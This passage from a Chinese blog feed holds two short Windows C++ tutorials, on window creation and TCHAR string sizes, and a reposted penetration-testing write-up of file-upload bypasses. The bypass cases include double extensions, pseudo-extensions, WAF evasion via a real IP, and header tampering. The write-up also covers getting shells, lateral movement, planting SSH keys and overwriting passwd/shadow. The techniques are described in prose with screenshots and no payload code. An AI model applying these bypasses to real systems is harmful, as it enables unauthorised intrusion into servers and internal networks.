lpfnWndProc;<br>  <span class="hljs-keyword">int</span>       cbClsExtra;<br>  <span class="hljs-keyword">int</span>       cbWndExtra;<br>  HINSTANCE hInstance;<br>  HICON     hIcon;<br>  HCURSOR   hCursor;<br>  HBRUSH    hbrBackground;<br>  LPCWSTR   lpszMenuName;<br>  LPCWSTR   lpszClassName;<br>&#125; WNDCLASSW, *PWNDCLASSW, *NPWNDCLASSW, *LPWNDCLASSW;<br></code></pre></td></tr></table></figure><blockquote><p>核心的是WNDPROC  和 LPCWSTP lpszClassName    这两个必须有值</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WindowProc</span><span class="hljs-params">(   <span class="hljs-comment">//消息处理函数</span></span></span><br><span class="hljs-params"><span class="hljs-function">_In_ HWND   hwnd,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ UINT   uMsg,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ WPARAM wParam,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_ LPARAM lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span>&#123;<br><span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (uMsg)<br>&#123;<br><span class="hljs-keyword">case</span> WM_CREATE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口创建了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> WM_CLOSE:<br><span class="hljs-built_in">MessageBoxW</span>(hwnd, <span class="hljs-string">L&quot;窗口关闭了&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_OK);<br><span class="hljs-built_in">DestroyWindow</span>(hwnd);<br><span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">DefWindowProcW</span>(hwnd,uMsg,wParam,lParam);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">WinMain</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">HINSTANCE hPreInstance,</span></span><br><span class="hljs-params"><span class="hljs-function">LPSTR lpCmdeLine,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">int</span> nCmdShow</span></span><br><span class="hljs-params"><span class="hljs-function">)</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//1.创建一个窗口类</span><br>WNDCLASSW myClass = &#123; <span class="hljs-number">0</span> &#125;;<br>myClass.lpszClassName = <span class="hljs-string">L&quot;51hook&quot;</span>;<br>myClass.lpfnWndProc = WindowProc;<br><span class="hljs-comment">//2.注册窗口类</span><br><span class="hljs-built_in">RegisterClassW</span>(&amp;myClass);<br><span class="hljs-comment">//3.创建窗口</span><br>HWND hwindow = <span class="hljs-built_in">CreateWindowW</span>(<br>myClass.lpszClassName,<br> <br><span class="hljs-string">L&quot;51hook&quot;</span>,<br>WS_OVERLAPPEDWINDOW,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br>CW_USEDEFAULT,<br><span class="hljs-number">0</span>,<br><span class="hljs-literal">NULL</span>,<br><span class="hljs-literal">NULL</span>,<br>hInstance,<br><span class="hljs-number">0</span><br>);<br><span class="hljs-comment">//4.显示窗口</span><br><span class="hljs-built_in">ShowWindow</span>(hwindow, SW_SHOWNORMAL);<br><br><span class="hljs-comment">//5.获取消息</span><br>MSG msg = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">GetMessageW</span>(&amp;msg, <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) &#123;<br><span class="hljs-built_in">DispatchMessageW</span>(&amp;msg);<span class="hljs-comment">//分发消息给消息处理函数</span><br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows编程字符串处理</title>
    <link href="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/"/>
    <url>/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/1.png" alt="1"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/2.png" alt="2"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/3.png" alt="3"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/4.png" alt="4"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/5.png" alt="5"></p><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/6.png" alt="6"></p><blockquote><p>tchar 是14的原因是 因为他是由环境决定   当前环境 默认是Unicode的 WCHAR 型   所以  和WCHAR 型的大小一样  如果 改变环境   tchar的大小也会跟着改变</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/7.png" alt="7"></p><blockquote><p>改变之后  tchar的大小就变为7了</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/8.png" alt="8"></p><blockquote><p>然后MessageBox函数如果用tchar类型 就不用管环境是什么了  因为tchar自动根据环境来变化</p></blockquote><p><img src="/2021/08/23/windows%E7%BC%96%E7%A8%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/9.png" alt="9"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>CHAR char_buff[] = <span class="hljs-string">&quot;123456&quot;</span>;<br>WCHAR wchar_buff[] = <span class="hljs-string">L&quot;123456&quot;</span>;<br>TCHAR tchar_buff[] = _T(<span class="hljs-string">&quot;123456&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof char_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(char_buff));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof wchar_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(wchar_buff));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof tchar_buff=%d/n&quot;</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(tchar_buff));<br><br><span class="hljs-built_in">MessageBox</span>(<span class="hljs-number">0</span>, _T(<span class="hljs-string">&quot;hello word&quot;</span>), _T(<span class="hljs-string">&quot;标题&quot;</span>), MB_OK);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传绕过思路拓展</title>
    <link href="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/"/>
    <url>/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/</url>
    
    <content type="html"><![CDATA[<h1 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h1><p>一次项目渗透时，通过往png后缀随便加个字符可知该上传点为白名单上传，正常情况下无法绕过</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1671284727.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\1.png" alt="img"></a></p><p>通过观察接口信息，发现接口名字为UploadImg，猜测该接口用于图片上传，按照开发的习惯，保不准会存在temp、test，这类的接口，随后通过fuzz找到存在的上传接口（file），但此时的接口（file）上传文件仍旧存在限制，需要绕过。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3472946638.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\2.png" alt="img"></a></p><p>由于黑名单限制不够严谨，经过多个伪后缀尝试，发现.cer后缀可绕过限制并被解析</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1665683640.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\3.png" alt="img"></a></p><p>然后就getshell进内网，后面的操作就不多说了。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2197535020.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\4.png" alt="img"></a></p><p>但并非往png后加个特殊字符能认为它是白名单不能进行绕过了，下面举个例子：</p><p>看到这种情况估计不少师傅都会认为后端做了白名单限制上传了吧，接着往下看，怎么去绕过它。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/926208312.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\5.png" alt="img"></a></p><p>错误回显提示了只能上传ppt/pptx/doc/docx/xls/xlsx/rar/jpg/png类型，但在后续的测试中，发现了types类型可控，且在存在多个后缀的情况下，后端只保留最后一个后缀，并重命名文件，所以只要上传后缀包含了白名单限制内的类型即可绕过，如（test.png.jsp），只会保留.jsp后缀，如下：</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1433005059.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\6.png" alt="img"></a></p><p>很多师傅看到白名单上传就会认为这个上传点足够安全，无法绕过，但其实不然，在存在多个上传接口的情况下，或许会存在没做限制，或者限制不严格的上传点也不一定，关键的是我们要如何发现这些接口，在此类接口存在限制时，如何去进行绕过，下面再举一个和接口绕过相关的例子。</p><h1 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h1><p>upload_2018.php接口白名单上传，在正常情况下，改变后缀会导致上传失败，如下</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3368800734.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\7.png" alt="img"></a></p><p>再进一步测试时发现存在多个上传接口，删除_2018使用upload接口进行文件上传，可导致任意文件上传</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1423244665.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\8.png" alt="img"></a></p><p>进一步传shell时发现存在waf（某讯云)，需进一步绕过。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2367732524.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\9.png" alt="img"></a></p><p>通过寻找域名真实IP，使用真实IP进行文件上传，绕过waf限制，为防止有心人，这里直接把IP给打码盖住了，以防万一。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/217557312.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\10.png" alt="img"></a></p><p>很多时候有一些开发为了便捷性，在部署上传接口时限制不够严谨或压根没做限制，这导致一旦被绕过限制传shell，都会导致非常严重的后果，当然，我们可以找一些temp、test这类上传接口，因为此类接口多数是开发过程中用作测试的，这种接口几乎都是无限上传文件类型的，同样的我们也可以找一些api文档进行上传接口的发现，这或许会有惊喜也说不定，之前写过关于接口测试类的安全文章，可参考<a href="https://blog.m1kh.com/index.php/archives/403/">关于Swagger-UI下的渗透实战</a></p><h1 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h1><p>这是一个把图片转base64的文件上传类型，具体绕过如下：</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3774740521.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\11.png" alt="img"></a></p><p>通过抓包发现图片是以base64进行上传的，观察了下数据包，发现可通过更改upload_0字段内容上传任意文件</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2617396617.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\12.png" alt="img"></a></p><p>访问HTML页面，成功被解析，可进一步上传shell获取权限。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2627957224.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\13.png" alt="img"></a></p><p>一句话shell上传后发现无法执行命令，之后通过上传PHPinfo发现其存在disable_functions，利用某斯拉绕过限制，getshell</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1873642010.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\14.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3820787191.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\15.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2700789588.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\16.png" alt="img"></a></p><h1 id="案例四"><a href="#案例四" class="headerlink" title="案例四"></a>案例四</h1><p>一个关于nginx解析漏洞的利用，这个漏洞是很久之前挖到的，这种漏洞现在应该不会存在了，单单是waf都能栏掉，这个就作为思路开拓说一下：</p><p>一次外网打点时发现了目标的一个核心系统，通过踩点发现了某上传功能，但上传接口存在白名单限制，且无其它的上传接口，由于这个站的shell比较重要，必须拿到，之后通过漏洞挖掘，发现目标存在nginx解析漏洞，结合图片上传点成功获取到了内网据点。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3593419550.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\17.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1979989394.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\18.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3605815075.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\19.png" alt="img"></a></p><h1 id="案例五"><a href="#案例五" class="headerlink" title="案例五"></a>案例五</h1><p>某次攻防踩点目标时发现了一个上传点，且在信息收集时发现了该目标存在内网环境，进一步想利用该功能点上传shell时却发现存在阻碍，通过fuzz后，发现可用空格绕过限制，最终利用该功能缺陷get shell进内网。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3988320782.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\20.png" alt="img"></a></p><p>正常上传.jsp后缀失败，尝试大小写、脏数据填充等也均失败。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/1628136031.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\21.png" alt="img"></a></p><p>之后留着shell内容不动，更改.jsp后缀为.png，发现可上传成功，由此判断后端不对上传内容做检测，再进一步测试时，发现可利用空格绕过限制上传shell，然后通过读取MSSQL密码，发现内网密码存在规律，最终通过该密码规律内网横向获取到了大量内网机器权限。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/2309134994.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\22.png" alt="img"></a><br><a href="https://blog.m1kh.com/usr/uploads/2021/06/4116338990.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\23.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3890187884.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\24.png" alt="img"></a></p><h1 id="案例六"><a href="#案例六" class="headerlink" title="案例六"></a>案例六</h1><p>一次项目测试中发现了一个上传点，但waf拦截jsp、html等后缀，更改后缀重放数据包会导致reset，如下：<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/3831654627.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\25.png" alt="img"></a></p><p>进一步测试发现fileName和fileType参数可控，且当存在两个不同的后缀时，最上层的filename参数优先级为最高，可导致任意文件上传<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/2073748874.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\26.png" alt="img"></a></p><p>发现上传成功的jsp文件其回显的type类型为image/png类型<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/2634279959.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\27.png" alt="img"></a></p><p>删除最下层filename的Content-Type: image/png，文件上传类型即可被绕过<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/3945470191.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\28.png" alt="img"></a></p><h1 id="其它场景-amp-总结"><a href="#其它场景-amp-总结" class="headerlink" title="其它场景&amp;总结"></a>其它场景&amp;总结</h1><p>有些时候文件上传成功后端没有返回路径，只回显了一个id号，这时候如果目标存在注入的话，我们可尝试用sqlmap的–search参数或者SQLshell对返回的ID号进行搜索，这样说不定就能找到shell地址了，之前在<a href="https://blog.m1kh.com/index.php/archives/403/">关于Swagger-UI下的渗透实战</a>也说过，感兴趣的可以去看看；也有文件上传成功却只回显一个文件名的，在前不久的一次攻防就遇到这种情况，后来是用了fuzz找到了完整的shell路径，另外在某些时候，上传文件可以跨目录，那么我们可以通过../进行跨目录上传，运气好的话，或许会在几个../后把shell传到域名的根目录下，如果当前上传文件夹无执行权限，那么跨目录上传shell也是个不错的思路；另外，如果上传目录可控，可上传文件到任意目录的话，在linux场景我们可上传一个ssh秘钥用于远程登录，极端一点的话，可考虑上传passwd、shadow文件覆盖系统用户，但前提是权限要足够大。</p><p>如果不能跨目录，站点又没有注入的话，那么我们可以尝试寻找网站日志文件，例如泛微E-COLOGY日志的日志，像这种日志文件是有规律可循的，可以用burp进行日志爆破，或许在日志文件中能找到shell路径也说不定，如果在日志中没有发现shell地址，那么可进一步观察日志里的文件路径，诸如upload，filepath这类路径，举一反三，可对这些路径fuzz shell地址。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1978765052.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\29.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1078504168.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\30.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2406307994.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\31.png" alt="img"></a></p><p>再者就是文件包含和文件读取了，文件读取的话可以通过读取日志和配置文件来发现shell地址，但是成功率太低了，至于文件包含，除了靶场和ctf，实战还没碰过。</p><p>还有一个关于burp的使用技巧，这是真实遇到的，上传shell后没有回显路径，但是通过http history搜索shell的名字发现了完整的shell路径，因为传上去的文件，如图片这类的总归是显示出来的，这时候可以先在web应用到处点点，多加载一些数据包，然后再到http history搜索shell的名字，或许会有惊喜也说不定。</p><p>另外要细心点观察上传数据包，或许改一下字段就可以绕过了，例如crc32这类校验。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/3815842614.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\32.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/43265324.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\33.png" alt="img"></a></p><p>某些时候上传黑名单不严谨，那么我们可用伪后缀进行绕过，其它多的就不说了，大概思路就这样，当绕过限制拿到shell时，总会给我带来乐趣，或许这就是我喜欢渗透的原因。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3011390688.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/blog\victoryBlog\source_posts\文件上传绕过思路拓展\34.png" alt="img"></a></p><p>文章来自：m1kh师傅 <a href="https://blog.m1kh.com/">https://blog.m1kh.com/</a> </p>]]></content>
    
    
    <categories>
      
      <category>文件上传</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从控制台到窗口程序</title>
    <link href="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/"/>
    <url>/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/</url>
    
